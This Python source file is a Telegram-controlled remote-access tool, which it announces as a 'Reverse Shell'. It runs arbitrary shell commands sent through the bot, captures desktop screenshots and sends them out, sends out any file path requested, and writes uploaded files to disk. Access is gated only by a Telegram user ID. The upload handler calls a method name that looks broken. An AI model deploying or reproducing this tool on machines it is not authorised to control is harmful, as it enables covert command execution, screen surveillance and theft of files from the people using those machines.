from dotenv import load_dotenv
import os
import subprocess
import pyautogui
import telebot
from telebot import types

load_dotenv()

# Configuration
TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
AUTHORIZED_USERS = [int(os.getenv("AUTHORIZED_USER_ID"))] # Your telegram ID

if not TOKEN:
    raise ValueError("Token is not found! Check .env file.")

bot = telebot.TeleBot(TOKEN)

def is_authorized(user_id):
    return user_id in AUTHORIZED_USERS


@bot.message_handler(commands=['start'])
def welcome(message):
    if not is_authorized(message.from_user.id):
        bot.reply_to(message, "Access denied")
        return
    
    markup = types.ReplyKeyboardMarkup(row_width=2)
    btn_shell = types.KeyboardButton('/shell')
    btn_screenshot = types.KeyboardButton('/screenshot')
    btn_download = types.KeyboardButton('/download')
    btn_upload = types.KeyboardButton('/upload')
    markup.add(btn_shell, btn_screenshot, btn_upload, btn_download)

    bot.reply_to(message, "Reverse Shell is Activated", reply_markup=markup)


@bot.message_handler(commands=['screenshot'])
def screenshot(message):
    if not is_authorized(message.from_user.id):
        return
    
    try:
        screenshot = pyautogui.screenshot()
        screenshot_path = "screenshot.png"
        screenshot.save(screenshot_path)

        with open(screenshot_path, 'rb') as photo:
            bot.send_photo(message.chat.id, photo)

        os.remove(screenshot_path)
    except Exception as e:
        bot.reply_to(message, f"Error: {str(e)}")


@bot.message_handler(commands=['shell'])
def handle_shell(message):
    if not is_authorized(message.from_user.id):
        return
    
    command = message.text.replace('/shell', '').strip()
    if not command:
        bot.reply_to(message, "Please provide a command after /shell")
        return

    try:
        result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
        bot.reply_to(message, f"Results:\n{result}")
    except subprocess.CalledProcessError as e:
        bot.reply_to(message, f"Error:\n{e.output}")


@bot.message_handler(commands=['download'])
def handle_download(message):
    if not is_authorized(message.from_user.id):
        return
    
    file_path = message.text.replace('/download', '').strip()
    if not file_path:
        bot.reply_to(message, "Please provide a file path after /download")
        return
    
    try:
        with open(file_path, 'rb') as file:
            bot.send_document(message.chat.id, file)
    except Exception as e:
        bot.reply_to(message, f"Error: {str(e)}")

@bot.message_handler(content_types=['document'])
def handle_upload(message):
    if not is_authorized(message.from_user.id):
        return
    
    try:
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.downloaded_file(file_info.file_path)

        file_name = message.document.file_name
        with open(file_name, 'wb') as new_file:
            new_file.write(downloaded_file)

        bot.reply_to(message, f"File {file_name} uploaded successfully")
    except Exception as e:
        bot.reply_to(message, f"Error: {str(e)}")

bot.infinity_polling()